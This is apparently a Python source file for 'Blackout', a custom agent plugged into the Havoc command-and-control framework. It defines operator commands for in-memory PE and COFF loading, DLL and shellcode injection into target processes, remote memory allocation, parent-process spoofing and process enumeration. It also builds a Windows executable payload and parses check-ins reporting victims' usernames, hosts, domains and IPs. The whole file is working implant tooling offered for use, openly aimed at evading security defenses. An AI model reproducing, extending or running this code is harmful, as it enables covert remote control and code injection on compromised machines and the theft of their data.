from base64 import b64decode
from havoc.service import HavocService
from havoc.agent import *

import os

CMD_COFFLOADER           = 0x500
BLACKOUT_ERROR           = 0x099
BLACKOUT_DEBUG           = 0x066
BLACKOUT_CHECKIN         = 0x055
COMMAND_REGISTER         = 0x100
COMMAND_GET_JOB          = 0x101
COMMAND_NO_JOB           = 0x102
COMMAND_RUN              = 0x120
CMD_PPID                 = 0x121
COMMAND_UPLOAD           = 0x153
COMMAND_DOWNLOAD         = 0x154
COMMAND_CLASSIC          = 0x151

COMMAND_EXPLORER         = 0X180
EXPLORER_LS  = 0x181
EXPLORER_CD  = 0x182
EXPLORER_PWD = 0x183
EXPLORER_CAT = 0x184

CMD_REFLECTION           = 0x502
CMD_DLLINJECTION         = 0x501
COMMAND_SLEEP            = 0x111
COMMAND_PPID             = 0x140
COMMAND_BLOCKDLLS        = 0x141
COMMAND_EXITP            = 0x160
COMMAND_EXITT            = 0x161
COMMAND_PROCLIST         = 0x170

COMMAND_MEMORY           = 0x300
MEMORY_ALLOC    = 0x301
MEMORY_ALLOC    = 0x301
MEMORY_WRITE    = 0x302
MEMORY_PROTECT  = 0x303
MEMORY_QUERY    = 0x304

COMMAND_OUTPUT           = 0x200

# ====================
# ===== Commands =====
# ====================
class CmdCheckin( Command ):
    CommandId   = BLACKOUT_CHECKIN
    Name        = "checkin"
    Description = "retrieve several informations from agent, machine ans connection"
    Help        = ""
    NeedAdmin   = False
    Params = []
    Mitr = []

    def job_generate( self, arguments:dict ) -> bytes:
        Task = Packer()

        Task.add_int( self.CommandId )

        return Task.buffer
    
class CommandCoffLdr( Command ):
    CommandId   = CMD_COFFLOADER
    Name        = "coff"
    Description = "execute coff/bof in memory"
    Help        = ""
    NeedAdmin   = False
    Mitr = []   
    Params = [
        CommandParam(
            name="path_to_coff",
            is_file_path=True,
            is_optional=False
        )
    ]

    def job_generate( self, arguments:dict ) -> bytes:
        Task = Packer()

        buffer = b64decode( arguments[ 'path_to_coff' ] )

        Task.add_int( self.CommandId )
        Task.add_data( buffer )

        return Task.buffer

class CmdReflective( Command ):
    CommandId   = CMD_REFLECTION
    Name        = "pe-loader"
    Description = "execute pe (exe/dll) in memory"
    Help        = ""
    NeedAdmin   = False
    Mitr = []   
    Params = [
        CommandParam(
            name="path_to_pe",
            is_file_path=True,
            is_optional=False
        ),
        CommandParam(
            name="argument",
            is_file_path=False,
            is_optional=True
        )
    ]

    def job_generate( self, arguments:dict ) -> bytes:
        Task = Packer()

        buffer = b64decode( arguments[ 'path_to_pe' ] )

        Task.add_int( self.CommandId )
        Task.add_data( buffer )
        Task.add_data( arguments[ 'argument' ] )

        return Task.buffer

class CmdProcEnum( Command ):
    CommandId   = COMMAND_PROCLIST
    Name        = "process-list"
    Description = "enumerate process on the machine"
    Help        = ""
    NeedAdmin   = False
    Mitr = []   
    Params = []

    def job_generate( self, arguments:dict ) -> bytes:
        Task = Packer()

        Task.add_int( self.CommandId )
        
        return Task.buffer
    
class CmdDllInjection( Command ):
    CommandId   = CMD_DLLINJECTION
    Name        = "injection-dll"
    Description = "perform dll injection"
    Help        = ""
    NeedAdmin   = False
    Params = [
        CommandParam(
            name="process_id",
            is_file_path=False,
            is_optional=False
        ),
        CommandParam(
            name="path_to_dll",
            is_file_path=False,
            is_optional=False
        ),
    ]

    Mitr = []

    def job_generate( self, arguments:dict ) -> bytes:
        Task = Packer()

        Task.add_int( self.CommandId )
        Task.add_int( int( arguments[ 'process_id' ] ) )
        Task.add_data( arguments[ 'path_to_dll' ] )

        return Task.buffer
    
class CmdMemoryAlloc( Command ):
    CommandId   = COMMAND_MEMORY
    Name        = "memory-alloc"
    Description = "alloc private memory in the target process"
    Help        = ""
    NeedAdmin   = False
    Params = [
        CommandParam(
            name="process_id",
            is_file_path=False,
            is_optional=False
        ),
        CommandParam(
            name="base_address",
            is_file_path=False,
            is_optional=False
        ),
        CommandParam(
            name="region_size",
            is_file_path=False,
            is_optional=False
        ),
        CommandParam(
            name="protection",
            is_file_path=False,
            is_optional=False
        )
    ]
    Mitr = []

    def job_generate( self, arguments:dict ) -> bytes:
        Task = Packer()

        Task.add_int(   self.CommandId )
        Task.add_int(   int( MEMORY_ALLOC ) )
        Task.add_int(   int( arguments[ 'process_id'  ] ) )
        Task.add_int(   int( arguments[ 'base_address' ] ) )
        Task.add_int64( int( arguments[ 'region_size'  ] ) )
        Task.add_int(   int( arguments[ 'protection'   ] ) )

        return Task.buffer

class CommandClassic( Command ):
    CommandId   = COMMAND_CLASSIC
    Name        = "injection-classic"
    Description = "perform classic injection"
    Help        = ""
    NeedAdmin   = False
    Params = [
        CommandParam(
            name="process_id",
            is_file_path=False,
            is_optional=False
        ),
        CommandParam(
            name="path_to_shellcode",
            is_file_path=True,
            is_optional=False
        ),
    ]

    Mitr = []

    def job_generate( self, arguments:dict ) -> bytes:
        Task = Packer()

        shellcode = b64decode( arguments[ 'path_to_shellcode' ] )

        Task.add_int( self.CommandId )
        Task.add_int( int( arguments[ 'process_id' ] ) )
        Task.add_data( shellcode )

        return Task.buffer

class CmdRun( Command ):
    CommandId   = COMMAND_RUN
    Name        = "process-create"
    Description = "create process with capabilities"
    Help        = ""
    NeedAdmin   = False
    Params = [
        CommandParam(
            name="process",
            is_file_path=False,
            is_optional=False
        )
    ]

    Mitr = []

    def job_generate( self, arguments:dict ) -> bytes:
        Task = Packer()

        Task.add_int( self.CommandId )
        Task.add_data( arguments[ 'process' ] )

        return Task.buffer
    
class CmdPpid( Command ):
    CommandId   = CMD_PPID
    Name        = "process-ppid"
    Description = "set ppid to spoofing (set 0 for disable)"
    Help        = ""
    NeedAdmin   = False
    Mitr = []   
    Params = [
        CommandParam(
            name="ppid",
            is_file_path=False,
            is_optional=False
        )
    ]

    def job_generate( self, arguments:dict ) -> bytes:
        Task = Packer()

        Task.add_int( self.CommandId )
        Task.add_int( int(arguments[ 'ppid' ]) )
        
        return Task.buffer

class CommandPwd( Command ):
    CommandId   = COMMAND_EXPLORER
    Name        = "pwd"
    Description = "print current directory"
    Help        = ""
    NeedAdmin   = False
    Mitr = []   
    Params = []

    def job_generate( self, arguments:dict ) -> bytes:
        Task = Packer()

        Task.add_int( self.CommandId )
        Task.add_int( EXPLORER_PWD )
        
        return Task.buffer
    
class CommandCd( Command ):
    CommandId   = COMMAND_EXPLORER
    Name        = "cd"
    Description = "change directory"
    Help        = ""
    NeedAdmin   = False
    Mitr = []   
    Params = [
        CommandParam(
            name="dir",
            is_file_path=False,
            is_optional=True
        )
    ]

    def job_generate( self, arguments:dict ) -> bytes:
        Task = Packer()

        Task.add_int( self.CommandId )
        Task.add_int( EXPLORER_CD )
        Task.add_data( arguments[ 'dir' ] )

        return Task.buffer

class CmdSleep( Command ):
    CommandId   = COMMAND_SLEEP
    Name        = "sleep"
    Description = "change sleep time"
    Help        = ""
    NeedAdmin   = False
    Mitr = []   
    Params = [
        CommandParam(
            name="sleep_time",
            is_file_path=False,
            is_optional=False
        )
    ]

    def job_generate( self, arguments:dict ) -> bytes:
        Task = Packer()

        Task.add_int( self.CommandId )
        Task.add_int( int( arguments[ 'sleep_time' ] ) )

        return Task.buffer

class CommandExitP( Command ):
    CommandId = COMMAND_EXITP
    Name        = "exit_process"
    Description = "exit the process"
    Help        = ""
    NeedAdmin   = False
    Mitr = []   
    Params = []

    def job_generate( self, arguments:dict ) -> bytes:
        Task = Packer()

        Task.add_int( self.CommandId )

        return Task.buffer

class CommandExitT( Command ):
    CommandId = COMMAND_EXITT
    Name        = "exit_thread"
    Description = "exit the thread"
    Help        = ""
    NeedAdmin   = False
    Mitr = []   
    Params = []

    def job_generate( self, arguments:dict ) -> bytes:
        Task = Packer()

        Task.add_int( self.CommandId )

        return Task.buffer


# =======================
# ===== Agent Class =====
# =======================
class Blackout(AgentType):
    Name = "blackout"
    Author = "oblivion"
    Version = "0.1"
    Description = f"""Blackout in security defense solutions"""
    MagicValue = 0x6F626C76 

    Arch = [
        "x64",
        "x86",
    ]

    Formats = [
        {
            "Name": "Windows Executable",
            "Extension": "exe"
        },
    ]

    BuildingConfig = {
        "Sleep": "10"
    }

    Commands = [
        CmdReflective(),
        CmdDllInjection(),
        CmdCheckin(),
        CmdPpid(),
        CmdMemoryAlloc(),
        CommandCoffLdr(),
        CmdProcEnum(),
        CommandClassic(),
        CmdRun(),
        CommandCd(),
        CommandPwd(),
        CmdSleep(),
        CommandExitP(),
        CommandExitT()
    ]

    # generate. this function is getting executed when the Havoc client requests for a binary/executable/payload. you can generate your payloads in this function.
    def generate( self, config: dict ) -> None:

        print( f"config: {config}" )

        # builder_send_message. this function send logs/messages to the payload build for verbose information or sending errors (if something went wrong).
        self.builder_send_message( config[ 'ClientID' ], "Info", f"hello from service builder" )
        self.builder_send_message( config[ 'ClientID' ], "Info", f"Options Config: {config['Options']}" )
        self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent Config: {config['Config']}" )

        # make and cmake
        os.system("make")

        # open .exe
        data = open("./Bin/blackout.exe", "rb").read()

        # build_send_payload. this function send back your generated payload
        self.builder_send_payload( config[ 'ClientID' ], self.Name + ".exe", data) # this is just an example.

    # this function handles incomming requests based on our magic value. you can respond to the agent by returning your data from this function.
    def response( self, response: dict ) -> bytes:

        agent_header    = response[ "AgentHeader" ]
        agent_response  = b64decode( response[ "Response" ] ) # the teamserver base64 encodes the request.
        response_parser = Parser( agent_response, len(agent_response) )
        Command         = response_parser.parse_int()

        if response[ "Agent" ] == None:
            # so when the Agent field is empty this either means that the agent doesn't exists.

            if Command == COMMAND_REGISTER:
                print( "[*] Is agent register request" )

                # Register info:
                #   - AgentID           : int [needed]
                #   - Hostname          : str [needed]
                #   - Username          : str [needed]
                #   - Domain            : str [optional]
                #   - InternalIP        : str [needed]
                #   - Process Path      : str [needed]
                #   - Process Name      : str [needed]
                #   - Process ID        : int [needed]
                #   - Process Parent ID : int [optional]
                #   - Process Arch      : str [needed]
                #   - Process Elevated  : int [needed]
                #   - OS Build          : str [needed]
                #   - OS Version        : str [needed]
                #   - OS Arch           : str [optional]
                #   - Sleep             : int [optional]

                RegisterInfo = {
                    "AgentID"           : response_parser.parse_int(),
                    "Hostname"          : response_parser.parse_str(),
                    "Username"          : response_parser.parse_str(),
                    "Domain"            : response_parser.parse_str(),
                    "InternalIP"        : response_parser.parse_str(),
                    "Process Path"      : response_parser.parse_wstr(),
                    "Process ID"        : str(response_parser.parse_int()),
                    "Process Parent ID" : str(response_parser.parse_int()),
                    "Process Arch"      : response_parser.parse_int(),
                    "Process Elevated"  : response_parser.parse_int(),
                    "OS Build"          : str(response_parser.parse_int()) + "." + str(response_parser.parse_int()) + "." + str(response_parser.parse_int()) + "." + str(response_parser.parse_int()) + "." + str(response_parser.parse_int()), # (MajorVersion).(MinorVersion).(ProductType).(ServicePackMajor).(BuildNumber)
                    "OS Arch"           : response_parser.parse_int(),
                    "SleepDelay"        : response_parser.parse_int(),
                }

                RegisterInfo[ "Process Name" ] = RegisterInfo[ "Process Path" ].split( "\\" )[-1]

                # this OS info is going to be displayed on the GUI Session table.
                RegisterInfo[ "OS Version" ] = RegisterInfo[ "OS Build" ] # "Windows Some version"

                if RegisterInfo[ "OS Arch" ] == 0:
                    RegisterInfo[ "OS Arch" ] = "x86"
                elif RegisterInfo[ "OS Arch" ] == 9:
                    RegisterInfo[ "OS Arch" ] = "x64/AMD64"
                elif RegisterInfo[ "OS Arch" ] == 5:
                    RegisterInfo[ "OS Arch" ] = "ARM"
                elif RegisterInfo[ "OS Arch" ] == 12:
                    RegisterInfo[ "OS Arch" ] = "ARM64"
                elif RegisterInfo[ "OS Arch" ] == 6:
                    RegisterInfo[ "OS Arch" ] = "Itanium-based"
                else:
                    RegisterInfo[ "OS Arch" ] = "Unknown (" + RegisterInfo[ "OS Arch" ] + ")"

                # Process Arch
                if RegisterInfo[ "Process Arch" ] == 0:
                    RegisterInfo[ "Process Arch" ] = "Unknown"

                elif RegisterInfo[ "Process Arch" ] == 1:
                    RegisterInfo[ "Process Arch" ] = "x86"

                elif RegisterInfo[ "Process Arch" ] == 2:
                    RegisterInfo[ "Process Arch" ] = "x64"

                elif RegisterInfo[ "Process Arch" ] == 3:
                    RegisterInfo[ "Process Arch" ] = "IA64"

                self.register( agent_header, RegisterInfo )

                return RegisterInfo[ 'AgentID' ].to_bytes( 4, 'little' ) # return the agent id to the agent

            else:
                print( "[-] Is not agent register request" )
        else:
            print( f"[*] Something else: {Command}" )

            AgentID = response[ "Agent" ][ "NameID" ]

            if Command == COMMAND_GET_JOB:
                print( "[*] Get list of jobs and return it." )

                Tasks = self.get_task_queue( response[ "Agent" ] )

                # if there is no job just send back a COMMAND_NO_JOB command.
                if len(Tasks) == 0:
                    Tasks = COMMAND_NO_JOB.to_bytes( 4, 'little' )

                print( f"Tasks: {Tasks.hex()}" )
                return Tasks            

            elif Command == BLACKOUT_DEBUG:
                Output = response_parser.parse_str()
                self.console_message( AgentID, "Good", "%s\n", "" )

            elif Command == CMD_COFFLOADER:
                Output = response_parser.parse_bytes()
                decoded_str = Output.decode('utf-8', errors='replace')  # Substitui caracteres não-ASCII por "�"
                print(decoded_str)
                self.console_message( AgentID, "Good", "Received output:", decoded_str )

            elif Command == COMMAND_OUTPUT:

                Output = response_parser.parse_str()
                print( "[*] Output: \n" + Output )

                self.console_message( AgentID, "Good", "Received Output:", Output )

            elif Command == BLACKOUT_CHECKIN:
                bk_base   = response_parser.parse_int64()
                bk_len    = response_parser.parse_int64()
                bk_rxbase = response_parser.parse_int64()
                bk_rxsize = response_parser.parse_int64()
                
                proc_name     = response_parser.parse_wstr()
                proc_fullpath = response_parser.parse_wstr()
                proc_cmdline  = response_parser.parse_wstr()
                proc_id       = response_parser.parse_int()
                proc_par_id   = response_parser.parse_int()
                protected     = response_parser.parse_int()
                protected_status = "true" if protected == 1 else "false"

                username      = response_parser.parse_str()
                computername  = response_parser.parse_str()
                domainame     = response_parser.parse_str()
                netbios       = response_parser.parse_str()
                ipaddress     = response_parser.parse_str()
                osarch        = response_parser.parse_int()
                product_type  = response_parser.parse_int()
                osmajor       = response_parser.parse_int()
                osminor       = response_parser.parse_int()
                osbuildern    = response_parser.parse_int()

                Output = (
                    f"Blackout memory config:\n"
                    f"\t=> Base Address: 0x{bk_base:X}\n"
                    f"\t=> Length: {bk_len} [0x{bk_len:X}] bytes\n"
                    f"\t=> RX Base Address: 0x{bk_rxbase:X} [0x{bk_rxsize:X} bytes]\n"
                    f"\t=> RX Size: {bk_rxsize} | \n"
                    
                    f"\nProcess informations:\n"
                    f"\t=> Process Name: {proc_name}\n"
                    f"\t=> Full Path: {proc_fullpath}\n"
                    f"\t=> Command Line: {proc_cmdline}\n"
                    f"\t=> Process ID: {proc_id}\n"
                    f"\t=> Parent Process ID: {proc_par_id}\n"
                    f"\t=> Protect: {protected_status}\n"
                    
                    f"\nSystem informations:\n"
                    f"\t=> Username: {username}\n"
                    f"\t=> Computer Name: {computername}\n"
                    f"\t=> Domain Name: {domainame}\n"
                    f"\t=> NetBIOS Name: {netbios}\n"
                    f"\t=> IP Address: {ipaddress}\n"
                    f"\t=> OS Architecture: {osarch}\n"
                    f"\t=> Product Type: {'Workstation' if product_type == 1 else 'Server'}\n"
                    f"\t=> OS Version: {osmajor}.{osminor}\n"
                    f"\t=> OS Build Number: {osbuildern}\n"
                )

                self.console_message( AgentID, "Good", f"Received informations from agent:\n", Output )

            elif Command == COMMAND_MEMORY:
                base_addr = response_parser.parse_int64()

                self.console_message( AgentID, "Good", f"Memory allocated with success at 0x{base_addr:X}", "" )

            elif Command == COMMAND_CLASSIC:
                procid  = response_parser.parse_int()
                ThreadId = response_parser.parse_int()
                address = response_parser.parse_int64() 
                shellcode_size = response_parser.parse_int()

                Output = f"\t- Process Id: {procid}\n\t- Address: {hex(address)} [{shellcode_size} bytes]\n\t- Thread Id: {ThreadId}"

                self.console_message( AgentID, "Good", f"Shellcode injected in" , Output )

            elif Command == COMMAND_RUN:
                bCheck   = response_parser.parse_int()
                ProcId   = response_parser.parse_int()
                ThdId    = response_parser.parse_int()
                PpOutput = response_parser.parse_str()

                Output = f"\t=> Process ID: {ProcId}\n\t=> Thread ID:  {ThdId}\n\t=> Output: {PpOutput}"

                print( PpOutput )

                self.console_message( AgentID, "Good", f"Process create succefully:", Output )

            elif Command == CMD_PPID:
                ppid = response_parser.parse_int()

                self.console_message( AgentID, "Good", f"Ppid set to {ppid} for spoofing", "" )

            elif Command == COMMAND_EXPLORER:
                explorer_id = response_parser.parse_int()

                if ( explorer_id == EXPLORER_CD ):
                    self.console_message( AgentID, "Good", "Successfully changed to directory %4x" % Command, "" )
    
                elif ( explorer_id == EXPLORER_PWD ):
                    curdir = response_parser.parse_str()
                    self.console_message( AgentID, "Good", f"Current directory is: {curdir}", "" )

            elif Command == COMMAND_SLEEP:
                sleep_time = response_parser.parse_int()

                self.console_message( AgentID, "Good", f"Sleep time set to {sleep_time}", "" )

            elif Command == COMMAND_PROCLIST:

                proc_name = response_parser.parse_wstr()
                proc_id   = response_parser.parse_int()
                p_proc_id = response_parser.parse_int()
                token_usr = response_parser.parse_str()
                nmbrs_thd = response_parser.parse_int()
                protected = response_parser.parse_int()
                isx64     = response_parser.parse_int()
                
                header = f"{'Process Name':<30} {'PID':<10} {'PPID':<10} {'Token User':<15} {'Threads':<10} {'Protected':<10} {'Architecture':<10}"
                separator = "-" * 100

                while True:
                    res = f"{proc_name:<30} {proc_id:<10} {p_proc_id:<10} {token_usr:<15} {nmbrs_thd:<10} {protected:<10} {'x64' if isx64 == 0 else 'x86':<10}"

                    proc_name = response_parser.parse_wstr()
                    proc_id   = response_parser.parse_int()
                    p_proc_id = response_parser.parse_int()
                    token_usr = response_parser.parse_str()
                    nmbrs_thd = response_parser.parse_int()
                    protected = response_parser.parse_int()
                    isx64     = response_parser.parse_int()

                    if proc_id is None or p_proc_id is None:
                        break

                output = f"{header}\n{separator}\n{res}"

                self.console_message( AgentID, "Good", "Process enumeration output:", output )

            elif Command == BLACKOUT_ERROR:
                ErrCode = response_parser.parse_int() 
                ErrMsg  = response_parser.parse_str()

                self.console_message(AgentID, "Error", f"Windows Error: {ErrCode} ({ErrMsg})", "")   

            else:
                self.console_message( AgentID, "Error", "Command not found: %4x" % Command, "" )

        return b''

def main():
    Havoc_Blackout: Blackout = Blackout()

    print( "[*] Connect to Havoc service api" )
    Havoc_Service = HavocService(
        endpoint="wss://127.0.0.1:40056/service-endpoint",
        password="service-password"
    )

    print( "[*] Register Blackout to Havoc" )
    Havoc_Service.register_agent(Havoc_Blackout)

    return

if __name__ == '__main__':
    main()
